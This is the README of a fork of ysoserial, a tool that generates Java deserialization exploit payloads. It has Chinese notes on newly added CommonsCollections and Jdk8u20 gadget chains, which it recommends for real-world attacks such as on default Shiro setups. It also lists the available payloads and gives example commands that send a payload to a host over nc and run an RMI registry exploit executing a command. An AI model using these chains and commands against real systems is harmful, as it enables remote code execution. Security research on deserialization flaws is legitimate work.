
# ysoserial

[![Join the chat at https://gitter.im/frohoff/ysoserial](
    https://badges.gitter.im/frohoff/ysoserial.svg)](
    https://gitter.im/frohoff/ysoserial?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)
[![Download Latest Snapshot](https://img.shields.io/badge/download-master-green.svg)](
    https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)
[![Travis Build Status](https://api.travis-ci.org/frohoff/ysoserial.svg?branch=master)](https://travis-ci.org/frohoff/ysoserial)
[![Appveyor Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)

A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.

![logo](ysoserial.png)

## Updates By Me:

打包好的 jar 可以直接下载使用: [https://github.com/zema1/ysoserial/releases](https://github.com/zema1/ysoserial/releases)

+ 添加 CommonsCollectionsK1 (commons-Collections <= 3.2.1 && allowTemplates)
+ 添加 CommonsCollectionsK2 (commons-Collections == 4.0 && allowTemplates)
+ 添加 CommonsCollectionsK3 (commons-Collections <= 3.2.1)
+ 添加 CommonsCollectionsK4 (commons-Collections == 4.0)
+ 添加 JDK8u20 （JDK7u21 的版本延伸 Gadget)
+ 缩减了 Templates 字节码的大小，可以避免超过 tomcat header 大小等。

CommonsCollections 的这4条链可以完全代替且超越原有的 CommonsCollections 的 7 条链，他们的环境依赖非常少，
仅仅依赖 commons-collections 一个库的版本，理论上会有更好的实战兼容性，你可以完全抛弃旧的7条转而放心的使用这4条利用链。
特别的, shiro 1.2.24 默认的环境可以使用 `CommonsCollectionsK1` 和 `CommonsCollectionsK2` 两条链来打。

+ CommonsCollectionsK1:
    ```
    HashMap.readObject
        TiedMapEntry.hashCode
         TiedMapEntry.getValue
           LazyMap.decorate
             InvokerTransformer
               templates...
    ```
+ CommonsCollectionsK2:

    K1 的 4.0 版, 仅改动了 lazymap 的使用使其能在 4.0 工作。

+ CommonsCollectionsK3:

    CommonsCollections6 的优化版，大幅缩减了 payload 长度，效果完全一致。

    ```
    java.util.HashMap.readObject()
        java.util.HashMap.hash()
            TiedMapEntry.hashCode()
                TiedMapEntry.getValue()
                LazyMap.get()
                    ChainedTransformer.transform()
    ```

+ CommonsCollectionsK4

    K3 的 4.0 版， 仅改动了 lazymap 的使用使其能在 4.0 工作。

+ Jdk8u20

    手写了反序列化数据流，绕过了 Jdk7u21 后续几个版本的修复, 也是比较好用的一个 Gadget。参考: [https://github.com/pwntester/JRE8u20_RCE_Gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget)，
    相比链接中的版本稳定性要好很多，而且 payload 也更小。

## 感谢

我写完后发现有位师傅之前写过一个和 K1 基本一致的链，也是英雄所见略同了。 [wh1t3p1g](https://github.com/wh1t3p1g/ysoserial)

另外，K3 参考了这位师傅的研究 https://xz.aliyun.com/t/7157

## Description

Originally released as part of AppSecCali 2015 Talk
["Marshalling Pickles: how deserializing objects will ruin your day"](
        http://frohoff.github.io/appseccali-marshalling-pickles/)
with gadget chains for Apache Commons Collections (3.x and 4.x), Spring Beans/Core (4.x), and Groovy (2.3.x).
Later updated to include additional gadget chains for
[JRE <= 1.7u21](https://gist.github.com/frohoff/24af7913611f8406eaf3) and several other libraries.

__ysoserial__ is a collection of utilities and property-oriented programming "gadget chains" discovered in common java
libraries that can, under the right conditions, exploit Java applications performing __unsafe deserialization__ of
objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then
serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes
this data, the chain will automatically be invoked and cause the command to be executed on the application host.

It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having
gadgets on the classpath.

## Disclaimer

This software has been created purely for the purposes of academic research and
for the development of effective defensive techniques, and is not intended to be
used to attack systems except where explicitly authorized. Project maintainers
are not responsible or liable for misuse of the software. Use responsibly.

## Usage

```shell
Y SO SERIAL?
Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
  Available payload types:
Jul 07, 2020 1:48:39 PM org.reflections.Reflections scan
INFO: Reflections took 179 ms to scan 1 urls, producing 17 keys and 164 values
     Payload              Authors                                Dependencies
     -------              -------                                ------------
     BeanShell1           @pwntester, @cschneider4711            bsh:2.0b5
     C3P0                 @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11
     Clojure              @JackOfMostTrades                      clojure:1.8.0
     CommonsBeanutils1    @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
     CommonsCollections1  @frohoff                               commons-collections<=3.2.1
     CommonsCollections2  @frohoff                               commons-collections4:4.0
     CommonsCollections3  @frohoff                               commons-collections<=3.2.1
     CommonsCollections4  @frohoff                               commons-collections4:4.0
     CommonsCollections5  @matthias_kaiser, @jasinner            commons-collections<=3.2.1
     CommonsCollections6  @matthias_kaiser                       commons-collections<=3.2.1
     CommonsCollections7  @scristalli, @hanyrax, @EdoardoVignati commons-collections<=3.2.1
     CommonsCollectionsK1 @koalr                                 commons-collections<=3.2.1
     CommonsCollectionsK2 @koalr                                 commons-collections4:4.0
     CommonsCollectionsK3 @koalr                                 commons-collections<=3.2.1
     CommonsCollectionsK4 @koalr                                 commons-collections4:4.0
     FileUpload1          @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
     Groovy1              @frohoff                               groovy:2.3.9
     Hibernate1           @mbechler
     Hibernate2           @mbechler
     JBossInterceptors1   @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     JRMPClient           @mbechler
     JRMPListener         @mbechler
     JSON1                @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     JavassistWeld1       @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     Jdk7u21              @frohoff
     Jdk8u20              @pwntester, @koalr
     Jython1              @pwntester, @cschneider4711            jython-standalone:2.5.2
     MozillaRhino1        @matthias_kaiser                       js:1.7R2
     MozillaRhino2        @_tint0                                js:1.7R2
     Myfaces1             @mbechler
     Myfaces2             @mbechler
     ROME                 @mbechler                              rome:1.0
     Spring1              @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
     Spring2              @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
     URLDNS               @gebl
     Vaadin1              @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
     Wicket1              @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
```

## Examples

```shell
$ java -jar ysoserial.jar CommonsCollections1 calc.exe | xxd
0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
...
0000550: 7672 0012 6a61 7661 2e6c 616e 672e 4f76  vr..java.lang.Ov
0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........
0000570: 0078 7071 007e 003a                      .xpq.~.:

$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
$ nc 10.10.10.10 1099 < groovypayload.bin

$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
```
